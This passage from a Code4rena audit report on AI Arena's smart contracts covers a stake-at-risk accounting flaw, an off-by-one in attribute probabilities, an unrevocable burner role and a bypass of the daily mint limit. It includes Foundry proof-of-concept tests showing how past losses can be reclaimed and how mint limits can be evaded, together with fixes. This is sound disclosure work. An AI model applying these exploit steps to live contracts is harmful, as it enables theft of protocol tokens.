    *   Since `amountLost[fighterOwner]` is a total amount regardless of rounds, it remains 100 even after the round.
    *   stakeAtRisk of NFT1: 0 (current round)
    *   amountLost: 100 (this should be unrecoverable)
*   Alice buys NFT 2 from the secondary market, which has 100 stakeAtRisk.
    *   stakeAtRisk of NFT1: 0
    *   stakeAtRisk of NFT2: 100
    *   amountLost: 100
*   Alice wins with NFT 2 and reclaims 100.
    *   stakeAtRisk of NFT1: 0
    *   stakeAtRisk of NFT2: 0
    *   amountLost: 0
*   Alice recovers the past loss through NFT 2. Alice recovered past lost, which shouldn't be recovered, which means she steals the protocol's token.

This is PoC. You can add it to StakeAtRisk.t.sol and run it.

*   testPoC1 shows that a user with `amountLost` 0 cannot record a victory with the purchased NFT due to underflow.
*   testPoC2 shows that a user who already has stakeAtRisk due to another NFT in the same round can no longer record a win due to underflow.
*   testPoC3 shows that a user can recover losses from a past round by using a purchased NFT.

<details>

```solidity
function testPoC1() public {
    address seller = vm.addr(3);
    address buyer = vm.addr(4);
    
    uint256 stakeAmount = 3_000 * 10 ** 18;
    uint256 expectedStakeAtRiskAmount = (stakeAmount * 100) / 100000;
    _mintFromMergingPool(seller);
    uint256 tokenId = 0;
    assertEq(_fighterFarmContract.ownerOf(tokenId), seller);
    _fundUserWith4kNeuronByTreasury(seller);
    vm.prank(seller);
    _rankedBattleContract.stakeNRN(stakeAmount, tokenId);
    assertEq(_rankedBattleContract.amountStaked(tokenId), stakeAmount);
    vm.prank(address(_GAME_SERVER_ADDRESS));
    // loses battle
    _rankedBattleContract.updateBattleRecord(tokenId, 50, 2, 1500, true);
    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId), expectedStakeAtRiskAmount);

    // seller unstake and sell NFT to buyer
    vm.startPrank(seller);
    _rankedBattleContract.unstakeNRN(_rankedBattleContract.amountStaked(tokenId), tokenId);
    _fighterFarmContract.transferFrom(seller, buyer, tokenId);
    vm.stopPrank();

    // The buyer win battle but cannot write at onchain
    vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x11)); // expect arithmeticError (underflow)
    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, true);

}

function testPoC2() public {
    address seller = vm.addr(3);
    address buyer = vm.addr(4);
    
    uint256 stakeAmount = 3_000 * 10 ** 18;
    uint256 expectedStakeAtRiskAmount = (stakeAmount * 100) / 100000;
    _mintFromMergingPool(seller);
    uint256 tokenId = 0;
    assertEq(_fighterFarmContract.ownerOf(tokenId), seller);
    _fundUserWith4kNeuronByTreasury(seller);
    vm.prank(seller);
    _rankedBattleContract.stakeNRN(stakeAmount, tokenId);
    assertEq(_rankedBattleContract.amountStaked(tokenId), stakeAmount);
    vm.prank(address(_GAME_SERVER_ADDRESS));
    // loses battle
    _rankedBattleContract.updateBattleRecord(tokenId, 50, 2, 1500, true);
    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId), expectedStakeAtRiskAmount);

    // seller unstake and sell NFT to buyer
    vm.startPrank(seller);
    _rankedBattleContract.unstakeNRN(_rankedBattleContract.amountStaked(tokenId), tokenId);
    _fighterFarmContract.transferFrom(seller, buyer, tokenId);
    vm.stopPrank();

    // The buyer have new NFT and loses with it
    uint256 stakeAmount_buyer = 3_500 * 10 ** 18;
    uint256 expectedStakeAtRiskAmount_buyer = (stakeAmount_buyer * 100) / 100000;

    _mintFromMergingPool(buyer);
    uint256 tokenId_buyer = 1;
    assertEq(_fighterFarmContract.ownerOf(tokenId_buyer), buyer);

    _fundUserWith4kNeuronByTreasury(buyer);
    vm.prank(buyer);
    _rankedBattleContract.stakeNRN(stakeAmount_buyer, tokenId_buyer);
    assertEq(_rankedBattleContract.amountStaked(tokenId_buyer), stakeAmount_buyer);

    // buyer loses with tokenId_buyer
    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(tokenId_buyer, 50, 2, 1500, true);
    
    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId_buyer), expectedStakeAtRiskAmount_buyer);
    assertGt(expectedStakeAtRiskAmount_buyer, expectedStakeAtRiskAmount, "buyer has more StakeAtRisk");

    // buyer win with bought NFT (tokenId 0)
    vm.startPrank(address(_GAME_SERVER_ADDRESS));
    for(uint256 i = 0; i < 1000; i++){
        _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, false);
    }
    vm.stopPrank();

    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId), 0); // Reclaimed all stakeAtRisk of bought NFT(token 0)
    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId_buyer), expectedStakeAtRiskAmount_buyer); // tokenId_buyer stakeAtRisk remains
    assertEq(_stakeAtRiskContract.amountLost(buyer), expectedStakeAtRiskAmount_buyer - expectedStakeAtRiskAmount, "remain StakeAtRisk");

    // the remain StakeAtRisk cannot be reclaimed even if buyer win with tokenId_buyer(token 1)
    // and the win result of token 1 cannot be saved at onchain
    vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x11)); // expect arithmeticError (underflow)
    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(tokenId_buyer, 50, 0, 1500, false);
}

function testPoC3() public {
    address seller = vm.addr(3);
    address buyer = vm.addr(4);
    
    uint256 stakeAmount = 3_000 * 10 ** 18;
    uint256 expectedStakeAtRiskAmount = (stakeAmount * 100) / 100000;

    // The buyer have new NFT and loses with it
    uint256 stakeAmount_buyer = 300 * 10 ** 18;
    uint256 expectedStakeAtRiskAmount_buyer = (stakeAmount_buyer * 100) / 100000;

    _mintFromMergingPool(buyer);
    uint256 tokenId_buyer = 0;
    assertEq(_fighterFarmContract.ownerOf(tokenId_buyer), buyer);

    _fundUserWith4kNeuronByTreasury(buyer);
    vm.prank(buyer);
    _rankedBattleContract.stakeNRN(stakeAmount_buyer, tokenId_buyer);
    assertEq(_rankedBattleContract.amountStaked(tokenId_buyer), stakeAmount_buyer);

    // buyer loses with tokenId_buyer
    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(tokenId_buyer, 50, 2, 1500, true);

    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId_buyer), expectedStakeAtRiskAmount_buyer);
    assertGt(expectedStakeAtRiskAmount, expectedStakeAtRiskAmount_buyer, "seller's token has more StakeAtRisk");

    // round 0 passed
    // tokenId_buyer's round 0 StakeAtRisk is reset
    vm.prank(address(_rankedBattleContract));
    _stakeAtRiskContract.setNewRound(1);
    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId_buyer), 0);

    // seller mint token, lose battle and sell the NFT
    _mintFromMergingPool(seller);
    uint256 tokenId = 1;
    assertEq(_fighterFarmContract.ownerOf(tokenId), seller);
    _fundUserWith4kNeuronByTreasury(seller);
    vm.prank(seller);
    _rankedBattleContract.stakeNRN(stakeAmount, tokenId);
    assertEq(_rankedBattleContract.amountStaked(tokenId), stakeAmount);
    vm.prank(address(_GAME_SERVER_ADDRESS));
    // loses battle
    _rankedBattleContract.updateBattleRecord(tokenId, 50, 2, 1500, true);
    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId), expectedStakeAtRiskAmount);

    // seller unstake and sell NFT to buyer
    vm.startPrank(seller);
    _rankedBattleContract.unstakeNRN(_rankedBattleContract.amountStaked(tokenId), tokenId);
    _fighterFarmContract.transferFrom(seller, buyer, tokenId);
    vm.stopPrank();

    
    // buyer win with bought NFT (tokenId 0)
    vm.startPrank(address(_GAME_SERVER_ADDRESS));
    for(uint256 i = 0; i < 100; i++){
        _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, false);
    }
    vm.stopPrank();

    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId), expectedStakeAtRiskAmount - expectedStakeAtRiskAmount_buyer); // Reclaimed all stakeAtRisk of bought NFT(token 1)
    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId_buyer), 0);
    assertEq(_stakeAtRiskContract.amountLost(buyer), 0, "reclaimed old lost");

    // and the win result of token 1 cannot be saved at onchain anymore
    vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x11)); // expect arithmeticError (underflow)
    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, false);

}
```
</details>

### Recommended Mitigation Steps

Tokens with a remaining StakeAtRisk should not be allowed to be exchanged.

```diff
function unstakeNRN(uint256 amount, uint256 tokenId) external {
    require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, "Caller does not own fighter");
    if (amount > amountStaked[tokenId]) {
        amount = amountStaked[tokenId];
    }
    amountStaked[tokenId] -= amount;
    globalStakedAmount -= amount;
    stakingFactor[tokenId] = _getStakingFactor(
        tokenId, 
        _stakeAtRiskInstance.getStakeAtRisk(tokenId)
    );
    _calculatedStakingFactor[tokenId][roundId] = true;
    hasUnstaked[tokenId][roundId] = true;
    bool success = _neuronInstance.transfer(msg.sender, amount);
    if (success) {
-       if (amountStaked[tokenId] == 0) {
+       if (amountStaked[tokenId] == 0 && _stakeAtRiskInstance.getStakeAtRisk(tokenId) == 0) {
            _fighterFarmInstance.updateFighterStaking(tokenId, false);
        }
        emit Unstaked(msg.sender, amount);
    }
}
```

**[hickuphh3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/137#issuecomment-1996612817):**
 > See comment on this vulnerability in the initial primary issue [#1641](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1641#issuecomment-1990163424).

**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/137#issuecomment-2003974918)**

**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/9

**Status:** Not fully mitigated. Full details in report from [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/51), and also included in the [Mitigation Review](#mitigation-review) section below.



***

## [[M-07] Erroneous probability calculation in physical attributes can lead to significant issues](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/112)
*Submitted by [haxatron](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/112), also found by [juancito](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1627), [BARW](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/585), [fnanni](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/437), and [DanielArmstrong](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/397)*

To determine what physical attributes a user gets first we obtain a `rarityRank` which is computed from the DNA.

[AiArenaHelper.sol#L106-L110](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L106C1-L110C18)

```solidity
                } else {
                    uint256 rarityRank = (dna / attributeToDnaDivisor[attributes[i]]) % 100;
                    uint256 attributeIndex = dnaToIndex(generation, rarityRank, attributes[i]);
                    finalAttributeProbabilityIndexes[i] = attributeIndex;
                }
```

Here since we use `% 100` operation is used, the range of `rarityRank` would be \[0,99].

This `rarityRank` is used in the `dnaToIndex` to determine the final attribute of the part.

[AiArenaHelper.sol#L165-L186](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L165C1-L186C6)

```solidity
     /// @dev Convert DNA and rarity rank into an attribute probability index.
     /// @param attribute The attribute name.
     /// @param rarityRank The rarity rank.
     /// @return attributeProbabilityIndex attribute probability index.
    function dnaToIndex(uint256 generation, uint256 rarityRank, string memory attribute) 
        public 
        view 
        returns (uint256 attributeProbabilityIndex) 
    {
        uint8[] memory attrProbabilities = getAttributeProbabilities(generation, attribute);
        
        uint256 cumProb = 0;
        uint256 attrProbabilitiesLength = attrProbabilities.length;
        for (uint8 i = 0; i < attrProbabilitiesLength; i++) {
            cumProb += attrProbabilities[i];
            if (cumProb >= rarityRank) {
                attributeProbabilityIndex = i + 1;
                break;
            }
        }
        return attributeProbabilityIndex;
    }
```

There is however, a very subtle bug in the calculation above due to the use of `cumProb >= rarityRank` as opposed to `cumProb > rarityRank`.

To explain the above, I will perform a calculation using a simple example. Let's say we only have 2 possible attributes and the `attrProbabilities` is \[50, 50].

1.  First iteration, when `i = 0`, we have `cumProb = 50`, for the `if (cumProb >= rarityRank)` to be entered the range of values `rarityRank` can be is \[0, 50]. Therefore there is a 51\% chance of obtaining this attribute

2.  Next iteration, when `i = 1`, we have `cumProb = 100`, for the `if (cumProb >= rarityRank)` to be entered the range of values `rarityRank` can be is \[51, 99]. Therefore there is a 49\% chance of obtaining this attribute.

This means that for values in the first index, the probability is 1\% greater than intended and for values in the last index the probability is 1\% lesser than intended. This can be significant in certain cases, let us run through two of them.

**Case 1: The first value in `attrProbabilities` is 1.**

If the first value in `attrProbabilities` is 1. Let's say \[1, 99].

Then in reality if we perform the calculation above we get the following results:

1.  First iteration, when `i = 0`, we have `cumProb = 1`, for the `if (cumProb >= rarityRank)` to be entered the range of values `rarityRank` can be is \[0, 1]. Therefore there is a 2\% chance of obtaining this attribute

2.  Next iteration, when `i = 1`, we have `cumProb = 100`, for the `if (cumProb >= rarityRank)` to be entered the range of values `rarityRank` can be is \[2, 99]. Therefore there is a 98\% chance of obtaining this attribute.

Then we have twice the chance of getting the rarer item, which would make it twice as common, thus devaluing it.

**Case 2: The last value in `attrProbabilities` is 1.**

If the last value in `attrProbabilities` is 1. Let's say \[99, 1].

Then in reality if we perform the calculation above we get the following results:

1.  First iteration, when `i = 0`, we have `cumProb = 99`, for the `if (cumProb >= rarityRank)` to be entered the range of values `rarityRank` can be is \[0, 99]. Therefore we will always enter the `if (cumProb >= rarityRank)` block.

Then it would be impossible (0\% chance) to obtain the 1\% item.

### Recommended Mitigation Steps

It should be `cumProb > rarityRank`. Going back to our example of \[50, 50], if it were `cumProb > rarityRank`. Then we will get the following results:

1.  First iteration, when `i = 0`, we have `cumProb = 50`, for the `if (cumProb > rarityRank)` to be entered the range of values `rarityRank` can be is \[0, 49]. Therefore there is a 50\% chance of obtaining this attribute

2.  Next iteration, when `i = 1`, we have `cumProb = 100`, for the `if (cumProb > rarityRank)` to be entered the range of values `rarityRank` can be is \[50, 99]. Therefore there is a 50\% chance of obtaining this attribute.

Thus the above recommended mitigation is correct.

**[hickuphh3 (judge) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/112#issuecomment-1977903075):**
 > Valid issue: wrong inclusion of boundary skews the probability to one-side by 1\%.<br>
 > The shift in probabilities will affect trait generation, which affects fighter valuations.

_Note: For full discussion, see [here](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/112)._



***

## [[M-08] Burner role cannot be revoked](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/47)
*Submitted by [Timenov](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/47), also found by [0x11singh99](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2096), [vnavascues](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2095), [MrPotatoMagic](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2091), [Rolezn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2086), merlinboii ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2077), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2076)), [btk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2065), [andywer](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1932), [0xblackskull](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1885), [josephdara](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1636), [CodeWasp](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1595), [MidgarAudits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1406), [Sabit](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1145), [SovaSlava](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/710), [lil\_eth](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/559), and [sobieski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/113)*

<https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/GameItems.sol#L185-L188> 

<https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/GameItems.sol#L242-L245>

In `GameItems::setAllowedBurningAddresses` the admin can update the `allowedBurningAddresses` mapping.

```solidity
    function setAllowedBurningAddresses(address newBurningAddress) public {
        require(isAdmin[msg.sender]);
        allowedBurningAddresses[newBurningAddress] = true;
    }
```

This mapping is used to check if the `msg.sender` has permission to burn specific amount of game items from an account. This can happen through the `burn` function.

```solidity
    function burn(address account, uint256 tokenId, uint256 amount) public {
        require(allowedBurningAddresses[msg.sender]);
        _burn(account, tokenId, amount);
    }
```

However `setAllowedBurningAddresses()` works only one way. I mean that the admin can give permission, but not revoke it.

### Proof of Concept

Imagine the following scenario. Admin calls `setAllowedBurningAddresses` with wrong address. Now this address has the permission to burn any token from any user. Now no one can remove the wrong address from the mapping.

### Recommended Mitigation Steps

Use `adjustAdminAccess` function as an example:

```solidity
    function adjustAdminAccess(address adminAddress, bool access) external {
        require(msg.sender == _ownerAddress);
        isAdmin[adminAddress] = access;
    }
```

So the new `setAllowedBurningAddresses` function should look something like this:

```solidity
    function adjustBurningAccess(address burningAddress, bool access) public {
        require(isAdmin[msg.sender]);
        allowedBurningAddresses[burningAddress] = access;
    }
```

Now even if the admin sets the wrong address, he can immediately change it.

**[hickuphh3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/47#issuecomment-1984979002):**
 > Similar to [M-02](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1507), but the root causes are different even though the effect is the same.

**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/18

**Status:** Not fully mitigated. Full details in report from [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/52), and also included in the [Mitigation Review](#mitigation-review) section below.



***

## [[M-09] Constraints of `dailyAllowanceReplenishTime` and `allowanceRemaining` during `mint()` can be bypassed by using alias accounts & `safeTransferFrom()`](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/43)
*Submitted by [t0x1c](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/43), also found by [visualbits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2023), [MrPotatoMagic](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1807), [0xDetermination](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1770), [MatricksDeCoder](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1715), [Greed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1674), [givn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1671), [VAD37](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1570), [MidgarAudits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1388), [Shubham](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1193), [PedroZurdo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1122), [forkforkdog](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1064), [Draiakoo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1010), [0xCiphky](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/961), [lil\_eth](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/897), [Velislav4o](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/889), [ladboy233](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/850), cats ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/731), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/726)), [lanrebayode77](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/624), [djxploit](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/401), [Kalogerone](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/390), [zaevlad](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/276), [btk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2085), [ZanyBonzy](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2082), and [SpicyMeatball](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/230)*

The [mint()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/GameItems.sol#L158-L161) function in `GameItems.sol` constraints a user from minting more than 10 game items in 1 day. This constraint can easily be bypassed since a similar check is missing inside the [safeTransferFrom()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/GameItems.sol#L291-L303) function:

<details>

```js
  File: src/GameItems.sol

  147:              function mint(uint256 tokenId, uint256 quantity) external {
  148:                  require(tokenId < _itemCount);
  149:                  uint256 price = allGameItemAttributes[tokenId].itemPrice * quantity;
  150:                  require(_neuronInstance.balanceOf(msg.sender) >= price, "Not enough NRN for purchase");
  151:                  require(
  152:                      allGameItemAttributes[tokenId].finiteSupply == false || 
  153:                      (
  154:                          allGameItemAttributes[tokenId].finiteSupply == true && 
  155:                          quantity <= allGameItemAttributes[tokenId].itemsRemaining
  156:                      )
  157:                  );
  158: @--->            require(
  159: @--->                dailyAllowanceReplenishTime[msg.sender][tokenId] <= block.timestamp || 
  160: @--->                quantity <= allowanceRemaining[msg.sender][tokenId]
  161:                  );
  162:          
  163:                  _neuronInstance.approveSpender(msg.sender, price);
  164:                  bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, price);
  165:                  if (success) {
  166:                      if (dailyAllowanceReplenishTime[msg.sender][tokenId] <= block.timestamp) {
  167:                          _replenishDailyAllowance(tokenId);
  168:                      }
  169:                      allowanceRemaining[msg.sender][tokenId] -= quantity;
  170:                      if (allGameItemAttributes[tokenId].finiteSupply) {
  171:                          allGameItemAttributes[tokenId].itemsRemaining -= quantity;
  172:                      }
  173:                      _mint(msg.sender, tokenId, quantity, bytes("random"));
  174:                      emit BoughtItem(msg.sender, tokenId, quantity);
  175:                  }
  176:              }
```
</details>

Missing check:

```js
  File: src/GameItems.sol

  291:              function safeTransferFrom(
  292:                  address from, 
  293:                  address to, 
  294:                  uint256 tokenId,
  295:                  uint256 amount,
  296:                  bytes memory data
  297:              ) 
  298:                  public 
  299:                  override(ERC1155)
  300:              {
  301:                  require(allGameItemAttributes[tokenId].transferable);
  302:                  super.safeTransferFrom(from, to, tokenId, amount, data);
  303:              }
```

**Note:** This could also lead to a situation where a NRN whale having enough funds can buy the complete supply of the game items within minutes by using his multiple alias accounts.

### Proof of Concept

*   Alice *(ownerAddress)* buys 10 batteries. She can't buy anymore until 1 day has passed.
*   Alice transfers some of her NRN to Bob *(Alice's alternate account)*.
*   Bob buys 10 batteries and transfers them to Alice, bypassing the constraints.

Add the following inside `test/GameItems.t.sol` and run with `forge test --mt test_MintGameItems_FromMultipleAccs_ThenTransfer -vv`:

```js
    function test_MintGameItems_FromMultipleAccs_ThenTransfer() public {
        // _ownerAddress's alternate account
        address aliasAccount1 = makeAddr("aliasAccount1");

        _fundUserWith4kNeuronByTreasury(_ownerAddress);
        _gameItemsContract.mint(0, 10); //paying 10 $NRN for 10 batteries
        assertEq(_gameItemsContract.balanceOf(_ownerAddress, 0), 10);
        
        // transfer some $NRN to alias Account
        _neuronContract.transfer(aliasAccount1, 10 * 10 ** 18);

        vm.startPrank(aliasAccount1);
        _gameItemsContract.mint(0, 10); //paying 10 $NRN for 10 batteries
        assertEq(_gameItemsContract.balanceOf(aliasAccount1, 0), 10);

        // transfer these game items to _ownerAddress
        _gameItemsContract.safeTransferFrom(aliasAccount1, _ownerAddress, 0, 10, "");

        assertEq(_gameItemsContract.balanceOf(_ownerAddress, 0), 20);
    }
```

### Tools used

Foundry

### Recommended Mitigation Steps

Add the same check inside `safeTransferFrom()` too:

```diff
  File: src/GameItems.sol

  291:              function safeTransferFrom(
  292:                  address from, 
  293:                  address to, 
  294:                  uint256 tokenId,
  295:                  uint256 amount,
  296:                  bytes memory data
  297:              ) 
  298:                  public 
  299:                  override(ERC1155)
  300:              {
  301:                  require(allGameItemAttributes[tokenId].transferable);
+                       require(dailyAllowanceReplenishTime[to][tokenId] <= block.timestamp || amount <= allowanceRemaining[to][tokenId], "Cannot bypass constraints via alias accounts");  
  302:                  super.safeTransferFrom(from, to, tokenId, amount, data);
  303:              }
```

**[hickuphh3 (judge) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/43#issuecomment-1982315463):**
 > Agree with the issue. The main impact is about bypassing replenishing / minting limits for **a specific account** by minting batteries / redeeming passes with multiple accounts & transferring all to that 1 account for consumption || transferring fighter NFTs back and forth across multiple wallets.



***

# Low Risk and Non-Critical Issues

For this audit, 60 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1695) by **givn** received the top score from the judge.

*The following wardens also submitted reports: [0xDetermination](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1794), [radev\_sw](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1509), [Aamir](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1490), [lsaudit](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/704), [peter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/702), [rspadi](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/507), [MrPotatoMagic](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2024), [vnavascues](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2018), [AlexCzm](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1986), [0xMosh](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1947), [nuthan2x](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1937), [PetarTolev](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1931), [0xAkira](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1877), [7ashraf](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1785), [rekxor](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1772), [Blank\_Space](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1661), [juancito](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1640), [ZanyBonzy](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1613), [KmanOfficial](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1607), [0x11singh99](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1606), [0xStriker](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1575), [DarkTower](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1571), [DeFiHackLabs](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1568), [yovchev\_yoan](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1553), [14si2o\_Flint](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1495), [McToady](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1355), [immeas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1343), [alexzoid](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1342), [agadzhalov](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1332), [0xmystery](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1325), [0xBinChook](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1275), [Bube](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1235), [forkforkdog](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1172), [SHA\_256](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1105), [BARW](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1101), [merlinboii](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1100), [BigVeezus](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1056), [offside0011](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1040), [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1023), [Krace](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/992), [EagleSecurity](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/975), [oualidpro](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/831), [kartik\_giri\_47538](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/822), [swizz](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/703), [btk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/674), [Rolezn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/669), [Tekken](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/627), [BenasVol](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/605), [shaflow2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/561), [dimulski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/536), [jesjupyter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/505), [Bauchibred](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/502), [shaka](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/471), [cartlex\_](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/422), [yotov721](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/398), [Timenov](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/300), [boredpukar](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/159), [SpicyMeatball](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/99), and [haxatron](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/28).*

## [01] Improve security posture of `_delegatedAddress` in `FighterFarm.sol`

The `_delegatedAddress` field represents the backend's address, responsible for signing various messages related to `claimFighters` .  There are two issues with it, which increase the risk for the protocol.

